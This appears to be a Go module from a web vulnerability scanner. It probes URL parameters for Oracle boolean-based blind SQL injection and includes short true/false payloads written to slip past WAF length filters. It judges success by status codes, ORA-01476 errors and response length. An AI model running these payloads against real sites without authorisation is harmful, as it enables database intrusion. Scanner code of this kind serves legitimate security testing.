package sqli

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

// ScanOracleLengthFilter attempts to detect Oracle SQLi where WAF/Filters block long payloads
func ScanOracleLengthFilter(baseURL string, client *http.Client, onFound func(core.Finding)) {
	// Only run if the URL has parameters
	if !strings.Contains(baseURL, "?") && !strings.Contains(baseURL, "&") {
		return
	}

	// 1. Establish Baseline
	respBase, err := client.Get(baseURL)
	if err != nil {
		return
	}
	baseBody, _ := io.ReadAll(respBase.Body)
	respBase.Body.Close()
	baseCode := respBase.StatusCode
	baseLen := len(baseBody)

	// 2. Check for Length Filter (Heuristic)
	// Send a long benign payload (150+ chars)
	longPadding := strings.Repeat("A", 150)
	longTarget := baseURL + "&bhyakugan_test=" + longPadding
	if strings.Contains(baseURL, "?") {
		longTarget = baseURL + "&bhyakugan_test=" + longPadding
	} else {
		longTarget = baseURL + "?bhyakugan_test=" + longPadding
	}

	respLong, errLong := client.Get(longTarget)
	if errLong == nil {
		defer respLong.Body.Close()
		// If Long Payload triggers 302/403/500/Error while Base is 200, it *might* be a length filter
		// The article mentions 302 Found as a symptom.
		if respLong.StatusCode != baseCode && (respLong.StatusCode == 302 || respLong.StatusCode == 403 || respLong.StatusCode == 500) {
			// Suspicious, proceed with optimized payload
		} else {
			// Even if no obvious filter, we still try the optimized payload as it's a valid Oracle Vector
		}
	}

	// 3. Shortest Boolean Payloads (from the article)
	// We need to inject this into existing parameters.
	// Payload: 'AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR'1'='1
	
	// We iterate over params. For simplicity, we append to the URL (assuming one param or appending to query string works).
	// Ideally, we should parse query params. For now, we append `&id=` or inject into `?id=` if exists.
	
	payloadTrue := "'AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR'1'='1"
	payloadFalse := "'AND(CASE WHEN(1=2)THEN 1ELSE 1/0END)=1OR'1'='1"

	// Construct Target (Inject into the first query param value or append)
	// Simple approach: Replace query params
	u, _ := url.Parse(baseURL)
	q := u.Query()
	
	for param := range q {
		originalVal := q.Get(param)
		
		// Test True
		q.Set(param, originalVal+payloadTrue)
		targetTrue := u.String() + "?" + q.Encode() // Re-encoding might break the specific ' format if not careful, but net/url handles it.
		// Wait, the payload relies on specific quoting. URL encoding is necessary.
		
		// Let's manually construct to ensure the payload isn't double-encoded or malformed by Go's encoder in a way that breaks SQLi (though usually Go is safe).
		// Better: q.Set(param, originalVal + payloadTrue) is correct.
		
		q.Set(param, originalVal + payloadTrue)
		u.RawQuery = q.Encode()
		targetTrue = u.String()

		respT, errT := client.Get(targetTrue)
		if errT != nil { continue }
		bodyT, _ := io.ReadAll(respT.Body)
		respT.Body.Close()
		
		// Test False
		q.Set(param, originalVal + payloadFalse)
		u.RawQuery = q.Encode()
		targetFalse := u.String()
		
		respF, errF := client.Get(targetFalse)
		if errF != nil { continue }
		bodyF, _ := io.ReadAll(respF.Body)
		respF.Body.Close()

		// 4. Verification Logic
		// Logic: True Payload should be similar to Baseline (200 OK)
		//        False Payload should be Different (500 Error, or 1/0 error -> "Divide by zero")
		
		isConfirmed := false
		evidence := ""
		severity := "High" // Default for Boolean Blind without extraction

		// Check 1: Status Code Difference
		if respT.StatusCode == baseCode && respF.StatusCode != baseCode {
			isConfirmed = true
			evidence = fmt.Sprintf("Status Code Difference:\n- Baseline: %d\n- True Payload: %d\n- False Payload: %d", baseCode, respT.StatusCode, respF.StatusCode)
		}

		// Check 2: Oracle Error in False Response
		// 1/0 in Oracle raises "ORA-01476: divisor is equal to zero"
		if strings.Contains(string(bodyF), "ORA-01476") || strings.Contains(string(bodyF), "divisor is equal to zero") {
			isConfirmed = true
			severity = "Critical" // Explicit error allows easier extraction
			evidence = "Oracle Error (Divisor is equal to zero) triggered by False payload."
		}

		// Check 3: Length/Content deviation
		lenT := len(bodyT)
		lenF := len(bodyF)
		
		if !isConfirmed {
			// If True is close to Baseline, and False is different
			if isSimilarLength(lenT, baseLen) && !isSimilarLength(lenF, baseLen) {
				isConfirmed = true
				evidence = fmt.Sprintf("Response Length Deviation:\n- Baseline: %d bytes\n- True Payload: %d bytes\n- False Payload: %d bytes", baseLen, lenT, lenF)
			}
		}

		if isConfirmed {
			// Construct Detailed Evidence
			fullEvidence := fmt.Sprintf(`
Payload A (TRUE): %s -> HTTP %d (Len: %d)
Payload B (FALSE): %s -> HTTP %d (Len: %d)
Baseline: %s -> HTTP %d (Len: %d)
Conclusion: Boolean-based SQL Injection confirmed (Oracle Length Filter Bypass).
Reason: %s`, 
				payloadTrue, respT.StatusCode, lenT,
				payloadFalse, respF.StatusCode, lenF,
				"Original Request", baseCode, baseLen,
				evidence)

			reportOracle(targetTrue, fullEvidence, severity, onFound)
			return
		}
	}
}

func isSimilarLength(a, b int) bool {
	diff := a - b
	if diff < 0 {
		diff = -diff
	}
	return diff < (b / 10) // 10% tolerance
}

func reportOracle(target, evidence, severity string, onFound func(core.Finding)) {
	fmt.Printf("[!] POSITIVE MATCH: Oracle SQLi (Length Filter Bypass) at %s\n", target)
	onFound(core.Finding{
		Type:     "Oracle SQLi (Length Filter Bypass)",
		Target:   target,
		Detail:   fmt.Sprintf("Defeated Length Filter using Shortest Boolean Payload.\n%s", evidence),
		Severity: severity,
	})
}
